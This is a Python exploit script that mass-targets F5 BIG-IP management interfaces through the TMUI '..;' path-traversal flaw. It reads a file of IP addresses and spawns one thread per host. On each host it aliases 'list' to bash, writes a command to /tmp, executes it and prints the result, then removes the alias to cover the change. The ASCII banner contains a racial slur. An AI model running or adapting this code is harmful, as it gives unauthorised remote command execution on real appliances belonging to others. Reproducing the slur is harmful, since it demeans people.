#coding:utf-8
import requests
import json
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import uuid
import sys
import threading
import time

# tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
# fileSave.jsp?fileName=/tmp/cmd&content=id
# tmshCmd.jsp?command=list+/tmp/cmd
# tmshCmd.jsp?command=delete+cli+alias+private+list

banner = r'''


███████╗██╗   ██╗██████╗ ██████╗ ██╗   ██╗
██╔════╝██║   ██║██╔══██╗██╔══██╗╚██╗ ██╔╝
█████╗  ██║   ██║██████╔╝██████╔╝ ╚████╔╝ 
██╔══╝  ██║   ██║██╔══██╗██╔══██╗  ╚██╔╝  
██║     ╚██████╔╝██║  ██║██║  ██║   ██║   
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
[!]Don't like furry??? DELETE THE PAGE NIGGA[!]
      [*]Coded by: @pwnhacker0x18
'''


def tmshCmd_exit(url,file,cmd):
    tmshCmd_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash"
    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
    r = requests.get(tmshCmd_url,verify=False,allow_redirects=False)
    response_str = json.dumps(r.headers.__dict__['_store'])
    if r.status_code == 200 and 'tmui' in response_str:
        upload_exit(url,file,cmd)



def upload_exit(url,file,cmd):
    fileSave_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/%s&content="%file + cmd
    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
    r = requests.get(fileSave_url,verify=False,allow_redirects=False)
    response_str = json.dumps(r.headers.__dict__['_store'])
    if r.status_code == 200 and 'tmui' in response_str:
        list_command(url,file)

def list_command(url,file):
    rce_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/%s" % file
    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
    r = requests.get(rce_url,verify=False,allow_redirects=False)
    response_str = json.dumps(r.headers.__dict__['_store'])
    if r.status_code == 200 and 'tmui' in response_str:
        if len(r.content) > 33:
            print("[+] Command Successfull !\n")
            command_result = json.loads(r.content)
            print(command_result['output'])
            delete_list(url)
    else:
        print("[+] Command Failed !\n")

def delete_list(url):
    delete_url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
    r = requests.get(delete_url,verify=False,allow_redirects=False)
    response_str = json.dumps(r.headers.__dict__['_store'])



class skid(threading.Thread):
	def __init__(self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:	# study requests to create your payloads
			url = 'https://' + self.ip
			file = str(uuid.uuid1())
			cmd = "id"
			tmshCmd_exit(url,file,cmd)
		except Exception as e:
			print(0)
			exit()



def main():
	print(banner)
	try:
		info = open(str(sys.argv[1])).readlines()
	except:
		print("[*]Usage: python exp.py vuln")
		exit()
	for ip in info:
		try:
			time.sleep(0.01)
			skid(ip).start()
		except:
			pass
main()
